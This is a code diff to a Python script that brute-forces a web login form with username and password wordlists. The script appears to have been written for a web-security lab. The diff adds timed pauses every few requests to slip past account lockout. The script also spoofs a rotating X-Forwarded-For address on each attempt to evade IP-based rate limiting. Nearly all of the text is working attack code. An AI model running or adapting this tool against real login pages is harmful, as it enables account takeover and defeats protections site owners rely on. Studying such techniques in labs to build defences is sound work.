@@ -1,16 +1,19 @@
 import requests
 import sys
+import time
 
 from io import BytesIO
 from lxml import etree
 
 TARGET = ''
 TIMEOUT = 10
-USERS_LIST = 'authentication/wordlists/usernames.txt'
+USERS_LIST = 'authentication/wordlists/usernames_acc_lock.txt'
 PASSWORD_LIST = 'authentication/wordlists/passwords.txt'
 USER_INPUT_NAME = 'username'
 PASSWORD_INPUT_NAME = 'password'
 SEARCH_TERM = 'Invalid username or password.'
+DELAY = 90
+DELAYED_REQUEST = 3
 
 def enumerate_usernames(target, users_list, user_input_name, password_input_name, search_term, timeout=10):
     session = requests.Session()
@@ -70,7 +73,7 @@ def enumerate_usernames(target, users_list, user_input_name, password_input_name
 
     return potential_usernames
 
-def enumerate_password(target, usernames, pwd_list, user_input_name, password_input_name, search_term, timeout=10):
+def enumerate_password(target, usernames, pwd_list, user_input_name, password_input_name, search_term, delay=0, delayed_request=0, timeout=10):
     passwords = list()
 
     try:
@@ -91,6 +94,7 @@ def enumerate_password(target, usernames, pwd_list, user_input_name, password_in
     failed_response = session.post(target, data, timeout=timeout)
     potential_credentials = list()
     octet = 1
+    requests_count = 1
 
     for password in passwords:
         data[password_input_name] = password
@@ -98,8 +102,11 @@ def enumerate_password(target, usernames, pwd_list, user_input_name, password_in
         for username in usernames:
             data[user_input_name] = username
 
+        if delay != 0 and requests_count % delayed_request == 0: time.sleep(delay)
+            
         test_response = session.post(target, data, headers={'X-Forwarded-For': '192.54.215.' + str(octet)}, timeout=timeout)
         octet += 1
+        requests_count += 1
 
         if test_response.status_code != failed_response.status_code:
             potential_credentials.append({'user': username, 'pwd': password})
@@ -141,7 +148,7 @@ def search_tree(content, term):
     parser = etree.HTMLParser()
     tree = etree.parse(BytesIO(content), parser=parser)
 
-    return tree.xpath(f'.//*[text()=\'{term}\']')
+    return bool(tree.xpath(f".//*[contains(normalize-space(string(.)), '{term}')]"))
 
 if __name__ == '__main__':
     #enumerate_usernames(TARGET, USERS_LIST, USER_INPUT_NAME, PASSWORD_INPUT_NAME, SEARCH_TERM, TIMEOUT)
@@ -152,5 +159,7 @@ if __name__ == '__main__':
         USER_INPUT_NAME,
         PASSWORD_INPUT_NAME,
         SEARCH_TERM,
+        DELAY,
+        DELAYED_REQUEST,
         TIMEOUT
     )
